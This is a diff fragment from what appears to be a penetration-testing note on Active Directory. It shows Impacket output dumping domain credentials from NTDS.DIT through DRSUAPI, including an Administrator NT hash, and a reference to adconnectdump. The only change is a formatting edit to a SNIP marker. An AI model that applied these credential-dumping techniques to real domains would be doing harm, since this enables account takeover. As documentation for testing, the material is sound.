@@ -108,7 +108,7 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
 [*] Using the DRSUAPI method to get NTDS.DIT secrets
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:7ddf32e17a6ac5ce04a8ecbf782ca509:::
-...[SNIP]...
+---[SNIP]---
 ```
 
 <small>*Ref: [adconnectdump](https://github.com/dirkjanm/adconnectdump/tree/master)*</small>
